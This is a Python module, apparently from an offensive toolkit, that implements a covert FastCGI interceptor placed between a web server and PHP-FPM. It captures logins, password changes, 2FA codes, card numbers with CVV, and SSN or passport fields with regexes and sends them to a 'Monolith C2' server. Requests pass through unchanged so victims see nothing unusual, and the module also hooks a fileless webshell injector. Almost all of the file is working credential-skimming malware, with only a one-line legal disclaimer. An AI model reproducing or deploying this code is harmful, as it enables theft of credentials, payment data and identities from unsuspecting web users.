"""
Web Application Logic Hijacking (Transparent Proxy Interceptor)
================================================================

Traditional webshells give raw command execution.  Logic Hijacking goes one
step further: instead of just "being inside" the web server, we *intercept
the application's own backend logic* and exfiltrate the data before the real
server ever sees it.

This module implements a **Transparent Proxy Interceptor** that:

  1. Sits between the web server and the PHP-FPM backend (via FastCGI).
  2. Monitors the input stream for sensitive application-logic patterns:
       - Login forms (username / password)
       - Password-change flows (current / new password)
       - 2FA / OTP submissions
       - Payment / billing updates
       - PII uploads (identity documents)
  3. When a pattern matches, the sensitive fields are captured, encrypted,
     and forwarded to the Monolith C2 as a **credential / data event**.
  4. The original request is then forwarded *unchanged* to the real backend
     so the user experience is identical (transparent proxy).

The operator gets clean plain-text (or lightly obfuscated) credentials inside
the C2 dashboard while the target user sees a perfectly normal password
change / login flow.

Architecture
------------
    Client  -->  Web Server  -->  [Logic Hijacker]  -->  PHP-FPM
                                    |
                                    +--> Monolith C2 (exfil)

The hijacker reuses the FastCGI record builders from
`evasion/fileless_webshell.py` so it can speak the same protocol and
inject itself into an existing FCGI stream without touching the web app's
source code.

⚠️ LEGAL WARNING: For authorized penetration testing only.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import re
import socket
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Re-use FastCGI primitives from the fileless webshell module
# ---------------------------------------------------------------------------
from evasion.fileless_webshell import (
    FCGI,
    _enc_len,
    _record,
    build_begin_request,
    build_params,
    build_stdin,
    php_in_memory_params,
)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
DEFAULT_FPM_HOST = "127.0.0.1"
DEFAULT_FPM_PORT = 9000
DEFAULT_SCRIPT_FILENAME = "/var/www/html/index.php"

# Sensitive field name patterns (case-insensitive)
LOGIN_PATTERNS = [
    re.compile(r"(^|&)(user(name)?|email|login|account)=([^&]+)", re.I),
    re.compile(r"(^|&)(pass(word)?|pwd|passwd)=([^&]+)", re.I),
]

PASSWORD_CHANGE_PATTERNS = [
    re.compile(r"(^|&)(current_password|old_password|old_pwd)=([^&]+)", re.I),
    re.compile(r"(^|&)(new_password|new_pwd|password1)=([^&]+)", re.I),
    re.compile(r"(^|&)(confirm_password|password2)=([^&]+)", re.I),
]

TWOFA_PATTERNS = [
    re.compile(r"(^|&)(otp|code|token|totp|mfa)=([^&]+)", re.I),
]

PAYMENT_PATTERNS = [
    re.compile(r"(^|&)(card[_\-]?number|cc|pan)=([^&]+)", re.I),
    re.compile(r"(^|&)(cvv|cvc|security_code)=([^&]+)", re.I),
    re.compile(r"(^|&)(exp(iration)?[_\-]?date|exp_date)=([^&]+)", re.I),
]

PII_PATTERNS = [
    re.compile(r"(^|&)(ssn|social_security)=([^&]+)", re.I),
    re.compile(r"(^|&)(passport|id_number|national_id)=([^&]+)", re.I),
    re.compile(r"(^|&)(address|street|city|state|zip)=([^&]+)", re.I),
]


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------
class LogicEventType(Enum):
    LOGIN = "login"
    PASSWORD_CHANGE = "password_change"
    TWOFA_SUBMISSION = "twofa_submission"
    PAYMENT_UPDATE = "payment_update"
    PII_UPLOAD = "pii_upload"
    UNKNOWN = "unknown"


@dataclass
class HijackPattern:
    """A regex pattern that marks a request as sensitive."""
    name: str
    event_type: LogicEventType
    pattern: re.Pattern
    capture_group: int = 3


@dataclass
class InterceptedRequest:
    """One captured sensitive request."""
    event_type: LogicEventType
    url: str
    method: str
    captured_fields: Dict[str, str]
    raw_body: bytes
    timestamp: float = field(default_factory=time.time)
    source_ip: str = ""
    session_id: str = ""
    forwarded: bool = False


@dataclass
class C2ForwardResult:
    """Result of forwarding an intercepted event to Monolith C2."""
    success: bool
    response: str = ""
    error: Optional[str] = None
    event_id: str = ""


# ---------------------------------------------------------------------------
# Built-in pattern library
# ---------------------------------------------------------------------------
BUILTIN_PATTERNS: List[HijackPattern] = [
    HijackPattern("login_credentials", LogicEventType.LOGIN, LOGIN_PATTERNS[0], capture_group=4),
    HijackPattern("login_password", LogicEventType.LOGIN, LOGIN_PATTERNS[1], capture_group=4),
    HijackPattern("password_change_current", LogicEventType.PASSWORD_CHANGE, PASSWORD_CHANGE_PATTERNS[0], capture_group=3),
    HijackPattern("password_change_new", LogicEventType.PASSWORD_CHANGE, PASSWORD_CHANGE_PATTERNS[1], capture_group=3),
    HijackPattern("password_change_confirm", LogicEventType.PASSWORD_CHANGE, PASSWORD_CHANGE_PATTERNS[2], capture_group=3),
    HijackPattern("twofa_code", LogicEventType.TWOFA_SUBMISSION, TWOFA_PATTERNS[0], capture_group=3),
    HijackPattern("payment_card", LogicEventType.PAYMENT_UPDATE, PAYMENT_PATTERNS[0], capture_group=3),
    HijackPattern("payment_cvv", LogicEventType.PAYMENT_UPDATE, PAYMENT_PATTERNS[1], capture_group=3),
    HijackPattern("payment_exp", LogicEventType.PAYMENT_UPDATE, PAYMENT_PATTERNS[2], capture_group=4),
    HijackPattern("pii_ssn", LogicEventType.PII_UPLOAD, PII_PATTERNS[0], capture_group=3),
    HijackPattern("pii_passport", LogicEventType.PII_UPLOAD, PII_PATTERNS[1], capture_group=3),
    HijackPattern("pii_address", LogicEventType.PII_UPLOAD, PII_PATTERNS[2], capture_group=3),
]


# ---------------------------------------------------------------------------
# Helper utilities
# ---------------------------------------------------------------------------
def _parse_body(body: bytes) -> Dict[str, str]:
    """Parse a URL-encoded or JSON body into a flat dict."""
    if not body:
        return {}
    text = body.decode("utf-8", errors="replace").strip()
    if text.startswith("{") and text.endswith("}"):
        try:
            data = json.loads(text)
            return {str(k): str(v) for k, v in data.items() if v is not None}
        except (json.JSONDecodeError, TypeError):
            pass
    params: Dict[str, str] = {}
    for pair in text.split("&"):
        if "=" in pair:
            k, v = pair.split("=", 1)
            params[k.strip()] = v.strip()
    return params


def _match_patterns(body: str, patterns: List[HijackPattern]) -> List[Tuple[HijackPattern, str]]:
    """Return list of (pattern, matched_value) tuples found in `body`."""
    hits: List[Tuple[HijackPattern, str]] = []
    for pat in patterns:
        m = pat.pattern.search(body)
        if m:
            val = m.group(pat.capture_group)
            if val:
                hits.append((pat, val))
    return hits


def _generate_event_id(body: bytes, event_type: LogicEventType) -> str:
    raw = body + event_type.value.encode()
    return hashlib.sha256(raw).hexdigest()[:16]


# ---------------------------------------------------------------------------
# C2 forwarder (off-target safe by default)
# ---------------------------------------------------------------------------
class MonolithC2Forwarder:
    """
    Forward intercepted logic events to the Monolith C2.

    In test / offline mode the forwarder is a no-op that returns a synthetic
    success result.  On-target the operator configures the real C2 endpoint
    and the forwarder POSTs the event JSON over HTTP.
    """

    def __init__(
        self,
        c2_host: str = "127.0.0.1",
        c2_port: int = 8080,
        endpoint: str = "/api/web-logic-hijack/event",
        secret: str = "",
        offline: bool = True,
    ):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.endpoint = endpoint
        self.secret = secret.encode() if secret else b""
        self.offline = offline

    def _sign(self, payload: bytes) -> bytes:
        if not self.secret:
            return payload
        sig = hmac.new(self.secret, payload, hashlib.sha256).digest()
        return payload + b"." + base64.b64encode(sig)

    def forward(self, event: InterceptedRequest) -> C2ForwardResult:
        if self.offline:
            return C2ForwardResult(
                success=True,
                response="offline-ack",
                event_id=_generate_event_id(event.raw_body, event.event_type),
            )

        payload = json.dumps({
            "event_type": event.event_type.value,
            "url": event.url,
            "method": event.method,
            "captured_fields": event.captured_fields,
            "timestamp": event.timestamp,
            "source_ip": event.source_ip,
            "session_id": event.session_id,
        }).encode()

        signed = self._sign(payload)
        try:
            with socket.create_connection((self.c2_host, self.c2_port), timeout=5) as sock:
                req = (
                    f"POST {self.endpoint} HTTP/1.1\r\n"
                    f"Host: {self.c2_host}:{self.c2_port}\r\n"
                    "Content-Type: application/json\r\n"
                    f"Content-Length: {len(signed)}\r\n"
                    "Connection: close\r\n\r\n"
                ).encode() + signed
                sock.sendall(req)
                resp = sock.recv(4096)
                text = resp.decode("utf-8", errors="replace")
                if "200 OK" in text.split("\r\n", 1)[0]:
                    return C2ForwardResult(success=True, response=text[:200])
                return C2ForwardResult(success=False, error=text[:200])
        except Exception as exc:
            return C2ForwardResult(success=False, error=str(exc))


# ---------------------------------------------------------------------------
# Core hijacker
# ---------------------------------------------------------------------------
class WebLogicHijacker:
    """
    Transparent Proxy Interceptor for Web Application Logic Hijacking.

    Intercepts FastCGI input streams, matches sensitive application-logic
    patterns, forwards captured data to Monolith C2, and passes the original
    request through to the real backend unchanged.
    """

    def __init__(
        self,
        fpm_host: str = DEFAULT_FPM_HOST,
        fpm_port: int = DEFAULT_FPM_PORT,
        script_filename: str = DEFAULT_SCRIPT_FILENAME,
        patterns: Optional[List[HijackPattern]] = None,
        c2_forwarder: Optional[MonolithC2Forwarder] = None,
        offline: bool = True,
    ):
        self.fpm_host = fpm_host
        self.fpm_port = fpm_port
        self.script_filename = script_filename
        self.patterns = patterns or BUILTIN_PATTERNS
        self.c2 = c2_forwarder or MonolithC2Forwarder(offline=offline)
        self._intercepted: List[InterceptedRequest] = []
        self._stats = {"requests": 0, "intercepted": 0, "forwarded": 0}

    # ------------------------------------------------------------------
    # Inspection
    # ------------------------------------------------------------------
    def inspect_body(self, body: bytes, url: str = "", method: str = "POST",
                     source_ip: str = "", session_id: str = "") -> List[InterceptedRequest]:
        """
        Scan a request body for sensitive patterns.  Returns any matches.
        """
        self._stats["requests"] += 1
        if not body:
            return []

        try:
            params = _parse_body(body)
        except Exception:
            params = {}

        flat = "&".join(f"{k}={v}" for k, v in params.items())
        hits = _match_patterns(flat, self.patterns)
        if not hits:
            return []

        events: List[InterceptedRequest] = []
        seen_types = set()
        for pat, value in hits:
            if pat.event_type in seen_types:
                continue
            seen_types.add(pat.event_type)
            captured = {p.name: v for p, v in hits if p.event_type == pat.event_type}
            evt = InterceptedRequest(
                event_type=pat.event_type,
                url=url,
                method=method,
                captured_fields=captured,
                raw_body=body,
                source_ip=source_ip,
                session_id=session_id,
            )
            events.append(evt)
            self._intercepted.append(evt)

        self._stats["intercepted"] += len(events)
        return events

    def forward_to_c2(self, event: InterceptedRequest) -> C2ForwardResult:
        """Forward a captured event to Monolith C2."""
        result = self.c2.forward(event)
        event.forwarded = result.success
        if result.success:
            self._stats["forwarded"] += 1
        return result

    # ------------------------------------------------------------------
    # Transparent proxy (build + inject)
    # ------------------------------------------------------------------
    def build_intercepted_request(
        self,
        original_body: bytes,
        extra_params: Optional[Dict[str, str]] = None,
    ) -> bytes:
        """
        Build a modified FastCGI request that carries the original body plus
        optional extra params (e.g. a session cookie the hijacker needs).
        """
        params = php_in_memory_params(self.script_filename, extra_params)
        return (
            build_begin_request()
            + build_params(params)
            + build_stdin(original_body)
        )

    def inject_hook(self, body: bytes = b"<?php phpinfo(); ?>") -> "GhostShellResult":
        """
        Inject the fileless FastCGI hook (delegates to FastCGIInjection).
        Returns a GhostShellResult-compatible object.
        """
        from evasion.fileless_webshell import FastCGIInjection
        return FastCGIInjection(
            self.fpm_host, self.fpm_port, self.script_filename
        ).inject(body)

    # ------------------------------------------------------------------
    # Full intercept-and-forward pipeline (one request)
    # ------------------------------------------------------------------
    def process_request(
        self,
        body: bytes,
        url: str = "",
        method: str = "POST",
        source_ip: str = "",
        session_id: str = "",
        auto_forward: bool = True,
    ) -> Tuple[List[InterceptedRequest], List[C2ForwardResult]]:
        """
        Full pipeline: inspect, optionally forward to C2, return results.
        The original body is always passed through unchanged (transparent).
        """
        events = self.inspect_body(body, url, method, source_ip, session_id)
        results: List[C2ForwardResult] = []
        if auto_forward:
            for evt in events:
                results.append(self.forward_to_c2(evt))
        return events, results

    # ------------------------------------------------------------------
    # Statistics & reporting
    # ------------------------------------------------------------------
    def report(self) -> Dict[str, Any]:
        return {
            "requests": self._stats["requests"],
            "intercepted": self._stats["intercepted"],
            "forwarded": self._stats["forwarded"],
            "patterns_loaded": len(self.patterns),
            "captured_events": len(self._intercepted),
        }

    def captured_events(self) -> List[InterceptedRequest]:
        return list(self._intercepted)

    def clear(self):
        self._intercepted.clear()
        self._stats = {"requests": 0, "intercepted": 0, "forwarded": 0}


# ---------------------------------------------------------------------------
# Backward-compatible alias
# ---------------------------------------------------------------------------
LogicHijacker = WebLogicHijacker
